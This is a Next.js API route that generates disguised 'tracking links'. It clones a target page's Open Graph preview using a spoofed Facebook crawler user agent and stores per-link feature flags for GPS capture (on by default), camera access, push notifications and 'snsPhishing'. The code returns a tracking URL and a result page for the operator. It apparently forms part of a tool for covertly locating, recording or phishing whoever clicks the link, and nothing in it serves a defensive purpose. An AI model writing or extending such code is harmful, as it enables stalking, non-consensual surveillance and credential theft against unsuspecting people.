import { NextResponse } from 'next/server'
import { createAdminClient } from '@/lib/supabase-admin'
import ogs from 'open-graph-scraper'

function generateShortId(length = 17) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    let result = ''
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length))
    }
    return result
}

export async function POST(request: Request) {
    try {
        const { targetUrl, features } = await request.json()

        if (!targetUrl) {
            return NextResponse.json({ error: 'Target URL is required' }, { status: 400 })
        }

        const defaultFeatures = { gps: true, camera: false, pushNotification: false, snsPhishing: false }
        const mergedFeatures = { ...defaultFeatures, ...(features || {}) }

        const supabase = createAdminClient()
        const shortId = generateShortId()

        let ogTitle = null;
        let ogDescription = null;
        let ogImage = null;

        try {
            const { result } = await ogs({
                url: targetUrl,
                fetchOptions: {
                    headers: {
                        'User-Agent': 'facebookexternalhit/1.1;line-poker/1.0',
                        'Accept-Language': 'ja,ja-JP;q=0.9,en-US;q=0.8,en;q=0.7'
                    }
                }
            });
            if (result.success) {
                ogTitle = result.ogTitle || null;
                ogDescription = result.ogDescription || null;
                ogImage = result.ogImage?.[0]?.url || null;
            }
        } catch (e) {
            console.error('Failed to fetch OG tags', e);
        }

        const { data: link, error } = await supabase
            .from('tracking_links')
            .insert({
                target_url: targetUrl,
                short_id: shortId,
                og_title: ogTitle,
                og_description: ogDescription,
                og_image: ogImage,
                features: mergedFeatures
            })
            .select('id, short_id')
            .single()

        if (error || !link) {
            console.error('Database error:', error)
            return NextResponse.json({ error: 'Failed to create tracking link' }, { status: 500 })
        }

        const trackingId = link.short_id || link.id

        // Return the generated UUID or shortId, which we use for both the tracking link and the result page
        return NextResponse.json({
            trackingId: trackingId,
            trackUrl: `/track/${trackingId}`,
            resultUrl: `/result/${trackingId}`
        })

    } catch (err) {
        console.error('Unexpected error:', err)
        return NextResponse.json({ error: 'Internal server error' }, { status: 500 })
    }
}
